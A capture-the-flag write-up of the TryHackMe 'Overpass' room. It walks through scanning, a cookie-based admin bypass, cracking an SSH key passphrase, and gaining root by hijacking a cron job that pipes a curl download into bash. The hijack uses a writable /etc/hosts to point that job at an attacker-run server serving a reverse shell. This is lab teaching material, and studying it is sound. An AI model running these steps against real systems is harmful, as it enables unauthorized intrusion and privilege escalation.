# TryHackMe - Overpass

[ROOM](https://tryhackme.com/room/overpass)

## 1. Reconnaissance

I started with RustScan to identify open ports on the target.

```bash
rustscan -a 10.48.130.139 -r 1-65535
```

Two open ports were discovered: **22 (SSH)** and **80 (HTTP)**.

Next, I used Nmap for service and version detection.

```bash
nmap -sC -sV -p22,80 10.48.130.139
```

The results identified OpenSSH 8.2p1 on port 22 and a Go-based HTTP server hosting the Overpass website on port 80.

## 2. Web Enumeration

I used Gobuster to discover directories and files on the web server.

```bash
gobuster dir -u http://10.48.130.139/ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt
```

The scan revealed several paths, including `/aboutus/`, `/admin/`, `/downloads/`, and `/img/`.

I visited `/admin/` and inspected the JavaScript files loaded by the page. Two files caught my attention: `login.js` and `cookie.js`.

## 3. Authentication Bypass

While analyzing `login.js`, I found the following logic:

```javascript
if (statusOrCookie === "Incorrect credentials") {
    loginStatus.textContent = "Incorrect Credentials"
    passwordBox.value = ""
} else {
    Cookies.set("SessionToken", statusOrCookie)
    window.location = "/admin"
}
```

The code checks whether the server response is exactly `Incorrect credentials`. If it is not, the browser stores the response as a `SessionToken` cookie and redirects to `/admin`.

This revealed a weakness in the client-side authentication flow. However, the code alone does not prove that the server accepts arbitrary session tokens; in this lab, changing the cookie allowed access to the administrator area.

I used a cookie editor to set `SessionToken` to a random value and reloaded the page. The administrator area became accessible.

## 4. Extracting and Cracking the SSH Private Key

Inside the administrator area, I found a message mentioning the user `james` and an encrypted RSA private key.

I saved the key as `id_rsa` and attempted to inspect it:

```bash
chmod 600 id_rsa
ssh-keygen -y -f id_rsa
```

The key required a passphrase, so I converted it into a format suitable for John the Ripper.

```bash
ssh2john id_rsa > hash.txt
john hash.txt
```

John successfully recovered the passphrase:

```text
james13
```

I then used the private key to connect to the target over SSH.

```bash
ssh -i id_rsa james@10.48.130.139
```

After entering the recovered passphrase, I obtained access as `james`.

## 5. Capturing the User Flag

Once connected, I listed the home directory and read `user.txt`.

```bash
ls
cat user.txt
```

**User flag obtained.**

## 6. Privilege Escalation Enumeration

To investigate possible privilege escalation paths, I searched for writable files.

```bash
find / -type f -writable 2>/dev/null
```

I also inspected the system-wide cron configuration.

```bash
cat /etc/crontab
```

One entry stood out:

```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This job runs every minute as `root`. It downloads `buildscript.sh` from `overpass.thm` and pipes the downloaded content directly into Bash.

The important weakness is that the script is executed with root privileges without verifying its integrity. If an attacker can control the content returned by that hostname, they may be able to execute arbitrary commands as root.

## 7. Exploiting the Cron Job

I found that `/etc/hosts` was writable. This allowed me to change the local resolution of `overpass.thm` so that it pointed to my attacking machine.

I added my VPN IP address to `/etc/hosts`:

```text
192.168.150.219 overpass.thm
```

On my attacking machine, I prepared a directory structure matching the requested URL path:

```bash
mkdir -p downloads/src
```

Inside `downloads/src/`, I created `buildscript.sh` containing a reverse-shell command configured to connect back to my machine.

I then started a Netcat listener on port `4444`:

```bash
nc -lvnp 4444
```

From the directory containing `downloads/`, I started a temporary HTTP server on port 80:

```bash
sudo python3 -m http.server 80
```

Because the target's cron job ran every minute, it eventually requested the script from my HTTP server and executed it as root. The reverse shell connected to my listener.

I verified the resulting privileges:

```bash
whoami
```

The shell returned `root`, confirming successful privilege escalation.
